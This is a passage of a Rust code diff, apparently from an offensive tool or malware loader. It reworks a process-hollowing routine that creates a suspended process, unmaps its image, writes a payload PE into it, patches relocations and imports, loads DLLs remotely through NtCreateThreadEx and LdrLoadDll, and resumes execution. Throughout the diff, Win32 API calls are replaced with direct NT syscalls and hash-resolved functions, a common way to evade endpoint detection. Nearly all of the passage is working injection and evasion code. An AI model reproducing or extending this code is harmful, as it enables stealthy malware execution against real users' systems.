-        null_mut(),
-        0,
-        CREATE_SUSPENDED,
-        null_mut(),
-        null_mut(),
-        &mut si,
-        &mut pi,
-    );
-    if ok == 0 {
-        return Err(anyhow!(
-            "CreateProcessA failed: {}",
-            winapi::um::errhandlingapi::GetLastError()
-        ));
-    }
 
     // Hollow original image via NtUnmapViewOfSection when possible.
-    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        .unwrap_or(0);
-    if ntdll_base == 0 {
-        tracing::warn!("hollow_and_execute(pe32): ntdll base not found via PEB; original image will not be unmapped");
-    } else {
-        let unmap_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
-        )
-        .unwrap_or(0);
-        if unmap_addr == 0 {
+    // Use Wow64GetThreadContext to read the 32-bit PEB address (Ebx in WOW64 initial context).
+    // NOTE: Wow64GetThreadContext / Wow64SetThreadContext are unresolved in the current
+    // winapi version used by this crate (pre-existing issue) — the PE32 path is currently
+    // non-functional on those calls; all other Win32 wrappers have been replaced with NT APIs.
+    {
+        let mut ctx: WOW64_CONTEXT = zeroed();
+        ctx.ContextFlags = WOW64_CONTEXT_FULL;
+        if Wow64GetThreadContext(h_thread, &mut ctx) == 0 {
             tracing::warn!(
-                "hollow_and_execute(pe32): NtUnmapViewOfSection not resolved; skipping unmap"
-            );
+                "hollow_and_execute(pe32): Wow64GetThreadContext failed; skipping unmap");
         } else {
-            type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
-            let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_addr);
-
-            let mut ctx: WOW64_CONTEXT = zeroed();
-            ctx.ContextFlags = WOW64_CONTEXT_FULL;
-            if Wow64GetThreadContext(pi.hThread, &mut ctx) == 0 {
+            let peb_ptr = ctx.Ebx as usize as *const u8;
+            let mut remote_image_base: u32 = 0;
+            let mut rd: usize = 0;
+            let _ = nt_syscall::syscall!(
+                "NtReadVirtualMemory",
+                h_process as u64, peb_ptr.add(0x8) as u64,
+                &mut remote_image_base as *mut _ as u64,
+                std::mem::size_of::<u32>() as u64,
+                &mut rd as *mut _ as u64,
+            );
+            if remote_image_base == 0 {
                 tracing::warn!(
-                    "hollow_and_execute(pe32): Wow64GetThreadContext failed ({}); skipping unmap",
-                    winapi::um::errhandlingapi::GetLastError()
-                );
+                    "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap");
             } else {
-                // In a newly-created WOW64 process, Ebx points to the 32-bit PEB.
-                let peb_ptr = ctx.Ebx as usize as *const u8;
-                let mut remote_image_base: u32 = 0;
-                ReadProcessMemory(
-                    pi.hProcess,
-                    peb_ptr.add(0x8) as _,
-                    &mut remote_image_base as *mut _ as _,
-                    std::mem::size_of::<u32>(),
-                    null_mut(),
-                );
-                if remote_image_base == 0 {
+                let us = nt_syscall::syscall!(
+                    "NtUnmapViewOfSection",
+                    h_process as u64, remote_image_base as u64,
+                ).unwrap_or(-1);
+                if us < 0 {
                     tracing::warn!(
-                        "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap"
-                    );
-                } else {
-                    let unmap_status = nt_unmap(pi.hProcess, remote_image_base as usize as _);
-                    if unmap_status < 0 {
-                        tracing::warn!(
-                            "hollow_and_execute(pe32): NtUnmapViewOfSection returned 0x{:x}; continuing",
-                            unmap_status
-                        );
-                    }
+                        "hollow_and_execute(pe32): NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
+                        us as u32);
                 }
             }
         }
     }
 
-    // Allocate RW first; execute permissions are applied per-section later.
-    let remote_base_ptr = VirtualAllocEx(
-        pi.hProcess,
-        preferred_base as _,
-        image_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    );
-    let remote_base_ptr = if remote_base_ptr.is_null() {
-        let fallback = VirtualAllocEx(
-            pi.hProcess,
-            null_mut(),
-            image_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
-        if fallback.is_null() {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            close_handle!(pi.hThread);
-            close_handle!(pi.hProcess);
-            return Err(anyhow!("VirtualAllocEx failed for PE32 hollowing"));
+    // Allocate RW first; execute permissions applied per-section later.
+    let mut alloc_base = preferred_base as *mut c_void;
+    let mut alloc_size = image_size;
+    let s = nt_syscall::syscall!(
+        "NtAllocateVirtualMemory",
+        h_process as u64, &mut alloc_base as *mut _ as u64,
+        0u64, &mut alloc_size as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+    ).unwrap_or(-1);
+    let remote_base_ptr = if s < 0 || alloc_base.is_null() {
+        let mut fb: *mut c_void = std::ptr::null_mut();
+        let mut fb_sz = image_size;
+        let s2 = nt_syscall::syscall!(
+            "NtAllocateVirtualMemory",
+            h_process as u64, &mut fb as *mut _ as u64,
+            0u64, &mut fb_sz as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+        ).unwrap_or(-1);
+        if s2 < 0 || fb.is_null() {
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!("NtAllocateVirtualMemory failed for PE32 hollowing: {:#010x}", s2 as u32));
         }
-        fallback
+        fb
     } else {
-        remote_base_ptr
+        alloc_base
     };
 
     let remote_base = remote_base_ptr as usize;
     let remote_base32 = u32::try_from(remote_base)
         .map_err(|_| anyhow!("hollow_and_execute: allocated PE32 base above 4GB ({remote_base:#x})"))?;
-    let mut written: SIZE_T = 0;
+    let mut written: usize = 0;
 
-    if WriteProcessMemory(
-        pi.hProcess,
-        remote_base_ptr,
-        payload.as_ptr() as _,
-        (*nt).OptionalHeader.SizeOfHeaders as usize,
-        &mut written,
-    ) == 0
-    {
-        winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-        close_handle!(pi.hThread);
-        close_handle!(pi.hProcess);
-        return Err(anyhow!("WriteProcessMemory(headers, pe32) failed"));
+    if nt_syscall::syscall!(
+        "NtWriteVirtualMemory",
+        h_process as u64, remote_base_ptr as u64,
+        payload.as_ptr() as u64,
+        (*nt).OptionalHeader.SizeOfHeaders as u64,
+        &mut written as *mut _ as u64,
+    ).unwrap_or(-1) < 0 {
+        nt_terminate!(h_process);
+        close_handle!(h_thread);
+        close_handle!(h_process);
+        return Err(anyhow!("NtWriteVirtualMemory(headers, pe32) failed"));
     }
 
     let num_sections = (*nt).FileHeader.NumberOfSections as usize;
@@ -804,25 +935,24 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     for i in 0..num_sections {
         let sec = &*first_section.add(i);
         let raw_off = sec.PointerToRawData as usize;
-        let raw_sz = sec.SizeOfRawData as usize;
+        let raw_sz  = sec.SizeOfRawData as usize;
         let virt_sz = *sec.Misc.VirtualSize() as usize;
         let copy_sz = raw_sz.min(virt_sz);
         if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
             continue;
         }
         let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
-        if WriteProcessMemory(
-            pi.hProcess,
-            dst,
-            payload.as_ptr().add(raw_off) as _,
-            copy_sz,
-            &mut written,
-        ) == 0
-        {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            close_handle!(pi.hThread);
-            close_handle!(pi.hProcess);
-            return Err(anyhow!("WriteProcessMemory(section {}, pe32) failed", i));
+        if nt_syscall::syscall!(
+            "NtWriteVirtualMemory",
+            h_process as u64, dst as u64,
+            payload.as_ptr().add(raw_off) as u64,
+            copy_sz as u64,
+            &mut written as *mut _ as u64,
+        ).unwrap_or(-1) < 0 {
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!("NtWriteVirtualMemory(section {}, pe32) failed", i));
         }
     }
 
@@ -831,56 +961,49 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         let reloc_dir = &(*nt).OptionalHeader.DataDirectory
             [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
         if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            close_handle!(pi.hThread);
-            close_handle!(pi.hProcess);
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
             return Err(anyhow!(
-                "hollow_and_execute(pe32): VirtualAllocEx at preferred base failed and PE has no relocation directory; cannot fix up"
-            ));
+                "hollow_and_execute(pe32): preferred base unavailable and PE has no reloc directory"));
         }
-        apply_relocations_remote32(pi.hProcess, remote_base, nt, payload, delta)?;
+        apply_relocations_remote32(h_process, remote_base, nt, payload, delta)?;
     }
 
-    fix_iat_remote32(pi.hProcess, remote_base, nt, payload, &mut written)?;
-    apply_section_protections32(pi.hProcess, remote_base, nt);
+    fix_iat_remote32(h_process, remote_base, nt, payload, &mut written)?;
+    apply_section_protections32(h_process, remote_base, nt);
 
     let mut ctx: WOW64_CONTEXT = zeroed();
     ctx.ContextFlags = WOW64_CONTEXT_FULL;
-    if Wow64GetThreadContext(pi.hThread, &mut ctx) == 0 {
+    if Wow64GetThreadContext(h_thread, &mut ctx) == 0 {
         tracing::warn!(
-            "hollow_and_execute(pe32): Wow64GetThreadContext failed before PEB image-base update ({}); skipping PEB write",
-            winapi::um::errhandlingapi::GetLastError()
-        );
+            "hollow_and_execute(pe32): Wow64GetThreadContext failed before PEB image-base update; skipping PEB write");
     } else {
         let peb_ptr = ctx.Ebx as usize as *const u8;
-        WriteProcessMemory(
-            pi.hProcess,
-            peb_ptr.add(0x8) as _,
-            &remote_base32 as *const _ as _,
-            std::mem::size_of::<u32>(),
-            &mut written,
+        let _ = nt_syscall::syscall!(
+            "NtWriteVirtualMemory",
+            h_process as u64, peb_ptr.add(0x8) as u64,
+            &remote_base32 as *const _ as u64,
+            std::mem::size_of::<u32>() as u64,
+            &mut written as *mut _ as u64,
         );
 
-        // For WOW64 startup context, Eax carries the user entry target.
         ctx.Eax = remote_base32.wrapping_add(entry_point_rva as u32);
-        if Wow64SetThreadContext(pi.hThread, &ctx) == 0 {
-            tracing::warn!(
-                "hollow_and_execute(pe32): Wow64SetThreadContext failed ({}); continuing",
-                winapi::um::errhandlingapi::GetLastError()
-            );
+        if Wow64SetThreadContext(h_thread, &ctx) == 0 {
+            tracing::warn!("hollow_and_execute(pe32): Wow64SetThreadContext failed; continuing");
         }
     }
 
-    winapi::um::processthreadsapi::FlushInstructionCache(
-        pi.hProcess,
-        remote_base as *mut c_void,
-        (*nt).OptionalHeader.SizeOfImage as usize,
+    let _ = nt_syscall::syscall!(
+        "NtFlushInstructionCache",
+        h_process as u64, remote_base as u64,
+        (*nt).OptionalHeader.SizeOfImage as u64,
     );
 
-    ResumeThread(pi.hThread);
+    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
 
-    close_handle!(pi.hThread);
-    close_handle!(pi.hProcess);
+    close_handle!(h_thread);
+    close_handle!(h_process);
     Ok(())
 }
 
@@ -892,9 +1015,6 @@ unsafe fn apply_relocations_remote32(
     payload: &[u8],
     delta: isize,
 ) -> Result<()> {
-    use winapi::shared::basetsd::SIZE_T;
-    use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
-
     let reloc_dir = &(*nt).OptionalHeader.DataDirectory
         [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
     if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
@@ -927,23 +1047,46 @@ unsafe fn apply_relocations_remote32(
             let rel = (entry & 0x0FFF) as usize;
             let target = (remote_base + page_rva + rel) as *mut c_void;
             match typ {
-                // IMAGE_REL_BASED_HIGHLOW (PE32)
+                // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
+                // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
+                // bits of the signed delta, giving correct modular results even
+                // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                 3 => {
                     let mut val: u32 = 0;
-                    let mut rd: SIZE_T = 0;
-                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 4, &mut rd);
-                    let patched = (val as i32).wrapping_add(delta as i32) as u32;
-                    let mut wr: SIZE_T = 0;
-                    WriteProcessMemory(hprocess, target, &patched as *const _ as _, 4, &mut wr);
+                    let mut rd: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtReadVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &mut val as *mut _ as u64, 4u64,
+                        &mut rd as *mut _ as u64,
+                    );
+                    let patched = val.wrapping_add(delta as u32);
+                    let mut wr: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &patched as *const _ as u64, 4u64,
+                        &mut wr as *mut _ as u64,
+                    );
                 }
                 // IMAGE_REL_BASED_DIR64 (accepted for completeness)
                 10 => {
                     let mut val: u64 = 0;
-                    let mut rd: SIZE_T = 0;
-                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
+                    let mut rd: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtReadVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &mut val as *mut _ as u64, 8u64,
+                        &mut rd as *mut _ as u64,
+                    );
                     val = val.wrapping_add(delta as u64);
-                    let mut wr: SIZE_T = 0;
-                    WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
+                    let mut wr: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &val as *const _ as u64, 8u64,
+                        &mut wr as *mut _ as u64,
+                    );
                 }
                 _ => {}
             }
@@ -959,10 +1102,8 @@ unsafe fn fix_iat_remote32(
     remote_base: usize,
     nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
     payload: &[u8],
-    written: &mut winapi::shared::basetsd::SIZE_T,
+    written: &mut usize,
 ) -> Result<()> {
-    use winapi::um::memoryapi::WriteProcessMemory;
-
     let import_dir = &(*nt).OptionalHeader.DataDirectory
         [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
     if import_dir.VirtualAddress == 0 {
@@ -1087,7 +1228,12 @@ unsafe fn fix_iat_remote32(
                     )
                 })?;
                 let iat_remote = (remote_base + iat_rva) as *mut c_void;
-                WriteProcessMemory(hprocess, iat_remote, &func_addr32 as *const _ as _, 4, written);
+                let _ = nt_syscall::syscall!(
+                    "NtWriteVirtualMemory",
+                    hprocess as u64, iat_remote as u64,
+                    &func_addr32 as *const _ as u64, 4u64,
+                    written as *mut _ as u64,
+                );
             }
 
             thunk_off += 4;
@@ -1106,7 +1252,6 @@ unsafe fn apply_section_protections32(
     remote_base: usize,
     nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
 ) {
-    use winapi::um::memoryapi::VirtualProtectEx;
     use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};
 
     const SCN_EXEC: u32 = 0x2000_0000;
@@ -1119,18 +1264,22 @@ unsafe fn apply_section_protections32(
         let sec = &*first_section.add(i);
         let chars = sec.Characteristics;
         let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
-            (true, true) => PAGE_EXECUTE_READ,
-            (true, false) => PAGE_EXECUTE_READ,
-            (false, true) => PAGE_READWRITE,
+            (true, true)   => PAGE_EXECUTE_READ,
+            (true, false)  => PAGE_EXECUTE_READ,
+            (false, true)  => PAGE_READWRITE,
             (false, false) => PAGE_READONLY,
         };
         let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
-        if virt_size == 0 {
-            continue;
-        }
-        let addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
+        if virt_size == 0 { continue; }
+        let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
+        let mut sz = virt_size;
         let mut old = 0u32;
-        VirtualProtectEx(hprocess, addr, virt_size, protect, &mut old);
+        let _ = nt_syscall::syscall!(
+            "NtProtectVirtualMemory",
+            hprocess as u64, &mut addr as *mut _ as u64,
+            &mut sz as *mut _ as u64, protect as u64,
+            &mut old as *mut _ as u64,
+        );
     }
 }
 
@@ -1142,9 +1291,6 @@ unsafe fn apply_relocations_remote(
     payload: &[u8],
     delta: isize,
 ) -> Result<()> {
-    use winapi::shared::basetsd::SIZE_T;
-    use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
-
     let reloc_dir = &(*nt).OptionalHeader.DataDirectory
         [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
     if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
@@ -1182,20 +1328,43 @@ unsafe fn apply_relocations_remote(
                 // IMAGE_REL_BASED_DIR64 (PE32+)
                 10 => {
                     let mut val: u64 = 0;
-                    let mut rd: SIZE_T = 0;
-                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
+                    let mut rd: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtReadVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &mut val as *mut _ as u64, 8u64,
+                        &mut rd as *mut _ as u64,
+                    );
                     val = val.wrapping_add(delta as u64);
-                    let mut wr: SIZE_T = 0;
-                    WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
+                    let mut wr: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &val as *const _ as u64, 8u64,
+                        &mut wr as *mut _ as u64,
+                    );
                 }
-                // IMAGE_REL_BASED_HIGHLOW (PE32)
+                // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
+                // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
+                // bits of the signed delta, giving correct modular results even
+                // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                 3 => {
                     let mut val: u32 = 0;
-                    let mut rd: SIZE_T = 0;
-                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 4, &mut rd);
-                    let patched = (val as i32).wrapping_add(delta as i32) as u32;
-                    let mut wr: SIZE_T = 0;
-                    WriteProcessMemory(hprocess, target, &patched as *const _ as _, 4, &mut wr);
+                    let mut rd: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtReadVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &mut val as *mut _ as u64, 4u64,
+                        &mut rd as *mut _ as u64,
+                    );
+                    let patched = val.wrapping_add(delta as u32);
+                    let mut wr: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        hprocess as u64, target as u64,
+                        &patched as *const _ as u64, 4u64,
+                        &mut wr as *mut _ as u64,
+                    );
                 }
                 _ => {}
             }
@@ -1588,40 +1757,13 @@ unsafe fn fix_iat_remote(
     remote_base: usize,
     nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
     payload: &[u8],
-    written: &mut winapi::shared::basetsd::SIZE_T,
+    written: &mut usize,
 ) -> Result<()> {
-    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
-    use winapi::um::processthreadsapi::{GetThreadContext, ResumeThread, SetThreadContext};
-    use winapi::um::synchapi::WaitForSingleObject;
-    use winapi::um::winbase::INFINITE;
-    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};
+    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
 
-    // Resolve NtCreateThreadEx once for remote DLL loading (L-01/L-02 fix).
+    // Resolve LdrLoadDll address for the remote-DLL-load path.
     let ntdll_base =
         pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
-    let ntcreate_opt = if ntdll_base != 0 {
-        pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
-        )
-    } else {
-        None
-    };
-    type NtCreateThreadExFn = unsafe extern "system" fn(
-        *mut *mut c_void,
-        u32,
-        *mut c_void,
-        *mut c_void,
-        *mut c_void,
-        *mut c_void,
-        u32,
-        usize,
-        usize,
-        usize,
-        *mut c_void,
-    ) -> i32;
-
-    // LdrLoadDll address (used as the remote thread start routine).
     let ldr_load_dll_addr = if ntdll_base != 0 {
         pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"LdrLoadDll\0"))
     } else {
@@ -1692,7 +1834,7 @@ unsafe fn fix_iat_remote(
             //   L-01: session-wide ASLR ensures both processes map the DLL at
             //         the same preferred base, so addresses we resolve locally
             //         remain valid remotely.
-            if let (Some(nt_create_addr), Some(ldr_addr)) = (ntcreate_opt, ldr_load_dll_addr) {
+            if let Some(ldr_addr) = ldr_load_dll_addr {
                 let wide_name: Vec<u16> = dll_name_str
                     .encode_utf16()
                     .chain(std::iter::once(0))
@@ -1703,23 +1845,24 @@ unsafe fn fix_iat_remote(
                     + std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
                 let total_remote = base_addr_offset + std::mem::size_of::<usize>();
 
-                let remote_block = VirtualAllocEx(
-                    hprocess,
-                    std::ptr::null_mut(),
-                    total_remote,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_READWRITE,
-                );
+                let mut rb: *mut c_void = std::ptr::null_mut();
+                let mut rb_sz = total_remote;
+                let alloc_s = nt_syscall::syscall!(
+                    "NtAllocateVirtualMemory",
+                    hprocess as u64, &mut rb as *mut _ as u64,
+                    0u64, &mut rb_sz as *mut _ as u64,
+                    (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+                ).unwrap_or(-1);
+                let remote_block = if alloc_s >= 0 { rb } else { std::ptr::null_mut() };
                 if !remote_block.is_null() {
                     let mut wr = 0usize;
-                    if WriteProcessMemory(
-                        hprocess,
-                        remote_block,
-                        wide_name.as_ptr() as _,
-                        wide_bytes,
-                        &mut wr,
-                    ) != 0
-                    {
+                    let ws = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        hprocess as u64, remote_block as u64,
+                        wide_name.as_ptr() as u64, wide_bytes as u64,
+                        &mut wr as *mut _ as u64,
+                    ).unwrap_or(-1);
+                    if ws >= 0 {
                         let remote_us_ptr =
                             (remote_block as usize + us_offset) as *mut c_void;
                         let remote_base_out =
@@ -1732,48 +1875,46 @@ unsafe fn fix_iat_remote(
                             Buffer: remote_str_va as *mut u16,
                         };
 
-                        if WriteProcessMemory(
-                            hprocess,
-                            remote_us_ptr,
-                            &mut remote_us as *mut _ as *const c_void,
-                            std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>(),
-                            &mut wr,
-                        ) != 0
-                        {
+                        let us_ws = nt_syscall::syscall!(
+                            "NtWriteVirtualMemory",
+                            hprocess as u64, remote_us_ptr as u64,
+                            &mut remote_us as *mut _ as u64,
+                            std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>() as u64,
+                            &mut wr as *mut _ as u64,
+                        ).unwrap_or(-1);
+                        if us_ws >= 0 {
                             let zero_base: usize = 0;
-                            if WriteProcessMemory(
-                                hprocess,
-                                remote_base_out,
-                                &zero_base as *const _ as *const c_void,
-                                std::mem::size_of::<usize>(),
-                                &mut wr,
-                            ) != 0
-                            {
-                                let nt_create_thread: NtCreateThreadExFn =
-                                    std::mem::transmute(nt_create_addr);
+                            let base_ws = nt_syscall::syscall!(
+                                "NtWriteVirtualMemory",
+                                hprocess as u64, remote_base_out as u64,
+                                &zero_base as *const _ as u64,
+                                std::mem::size_of::<usize>() as u64,
+                                &mut wr as *mut _ as u64,
+                            ).unwrap_or(-1);
+                            if base_ws >= 0 {
                                 let mut h_thread: *mut c_void = std::ptr::null_mut();
-                                let status = nt_create_thread(
-                                    &mut h_thread,
-                                    0x1FFFFF,
-                                    std::ptr::null_mut(),
-                                    hprocess,
-                                    ldr_addr as *mut c_void,
-                                    remote_us_ptr,
-                                    0x1, // create suspended so we can set up args
-                                    0,
-                                    0,
-                                    0,
-                                    std::ptr::null_mut(),
-                                );
+                                let status = nt_syscall::syscall!(
+                                    "NtCreateThreadEx",
+                                    &mut h_thread as *mut _ as u64,
+                                    NT_THREAD_ALL_ACCESS as u64,
+                                    0u64,
+                                    hprocess as u64,
+                                    ldr_addr as u64,
+                                    remote_us_ptr as u64,
+                                    NT_THREAD_SUSPENDED as u64,
+                                    0u64, 0u64, 0u64, 0u64,
+                                ).unwrap_or(-1);
                                 if status >= 0 && !h_thread.is_null() {
                                     #[cfg(target_arch = "x86_64")]
                                     {
                                         let mut ctx: CONTEXT = std::mem::zeroed();
                                         ctx.ContextFlags = CONTEXT_FULL;
-                                        if GetThreadContext(h_thread, &mut ctx) == 0 {
+                                        if nt_syscall::syscall!(
+                                            "NtGetContextThread",
+                                            h_thread as u64, &mut ctx as *mut _ as u64,
+                                        ).unwrap_or(-1) < 0 {
                                             tracing::warn!(
-                                                "fix_iat_remote: GetThreadContext before LdrLoadDll failed ({})",
-                                                winapi::um::errhandlingapi::GetLastError()
+                                                "fix_iat_remote: NtGetContextThread before LdrLoadDll failed"
                                             );
                                         } else {
                                             // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
@@ -1781,10 +1922,12 @@ unsafe fn fix_iat_remote(
                                             ctx.Rdx = 0;
                                             ctx.R8 = remote_us_ptr as u64;
                                             ctx.R9 = remote_base_out as u64;
-                                            if SetThreadContext(h_thread, &ctx) == 0 {
+                                            if nt_syscall::syscall!(
+                                                "NtSetContextThread",
+                                                h_thread as u64, &ctx as *const _ as u64,
+                                            ).unwrap_or(-1) < 0 {
                                                 tracing::warn!(
-                                                    "fix_iat_remote: SetThreadContext for LdrLoadDll failed ({})",
-                                                    winapi::um::errhandlingapi::GetLastError()
+                                                    "fix_iat_remote: NtSetContextThread for LdrLoadDll failed"
                                                 );
                                             }
                                         }
@@ -1797,20 +1940,25 @@ unsafe fn fix_iat_remote(
                                         );
                                     }
 
-                                    ResumeThread(h_thread);
-                                    WaitForSingleObject(h_thread, INFINITE);
+                                    let _ = nt_syscall::syscall!(
+                                        "NtResumeThread", h_thread as u64, 0u64,
+                                    );
+                                    // Wait with no timeout (null = infinite).
+                                    let _ = nt_syscall::syscall!(
+                                        "NtWaitForSingleObject", h_thread as u64,
+                                        0u64, 0u64,
+                                    );
 
                                     let mut loaded_remote_base: usize = 0;
                                     let mut rd = 0usize;
-                                    if ReadProcessMemory(
-                                        hprocess,
-                                        remote_base_out,
-                                        &mut loaded_remote_base as *mut _ as *mut c_void,
-                                        std::mem::size_of::<usize>(),
-                                        &mut rd,
-                                    ) == 0
-                                        || rd != std::mem::size_of::<usize>()
-                                    {
+                                    let read_s = nt_syscall::syscall!(
+                                        "NtReadVirtualMemory",
+                                        hprocess as u64, remote_base_out as u64,
+                                        &mut loaded_remote_base as *mut _ as u64,
+                                        std::mem::size_of::<usize>() as u64,
+                                        &mut rd as *mut _ as u64,
+                                    ).unwrap_or(-1);
+                                    if read_s < 0 || rd != std::mem::size_of::<usize>() {
                                         tracing::warn!(
                                             "fix_iat_remote: could not read remote LdrLoadDll base output for {}",
                                             dll_name_str
@@ -1825,14 +1973,20 @@ unsafe fn fix_iat_remote(
                                     pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
                                 } else {
                                     tracing::warn!(
-                                        "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:x}",
-                                        status
+                                        "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
+                                        status as u32
                                     );
                                 }
                             }
                         }
                     }
-                    winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_block, 0, MEM_RELEASE);
+                    let mut rb2 = remote_block;
+                    let mut rb2_sz: usize = 0; // MEM_RELEASE ignores size
+                    let _ = nt_syscall::syscall!(
+                        "NtFreeVirtualMemory",
+                        hprocess as u64, &mut rb2 as *mut _ as u64,
+                        &mut rb2_sz as *mut _ as u64, NT_MEM_RELEASE as u64,
+                    );
                 }
             } else {
                 tracing::warn!(
@@ -1920,12 +2074,11 @@ unsafe fn fix_iat_remote(
                 // Write the resolved address into the remote IAT entry.  Use the
                 // RVA (not the file offset) to compute the remote target address.
                 let iat_remote = (remote_base + iat_rva) as *mut c_void;
-                WriteProcessMemory(
-                    hprocess,
-                    iat_remote,
-                    &func_addr as *const _ as _,
-                    8,
-                    written,
+                let _ = nt_syscall::syscall!(
+                    "NtWriteVirtualMemory",
+                    hprocess as u64, iat_remote as u64,
+                    &func_addr as *const _ as u64, 8u64,
+                    written as *mut _ as u64,
                 );
             }
             thunk_off += 8;
@@ -1945,7 +2098,6 @@ unsafe fn apply_section_protections(
     remote_base: usize,
     nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
 ) {
-    use winapi::um::memoryapi::VirtualProtectEx;
     use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};
 
     const SCN_EXEC: u32 = 0x2000_0000;
@@ -1958,18 +2110,22 @@ unsafe fn apply_section_protections(
         let sec = &*first_section.add(i);
         let chars = sec.Characteristics;
         let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
-            (true, true) => PAGE_EXECUTE_READ, // downgrade W+X: no legitimate code section needs RWX
-            (true, false) => PAGE_EXECUTE_READ,
-            (false, true) => PAGE_READWRITE,
+            (true, true)   => PAGE_EXECUTE_READ, // downgrade W+X
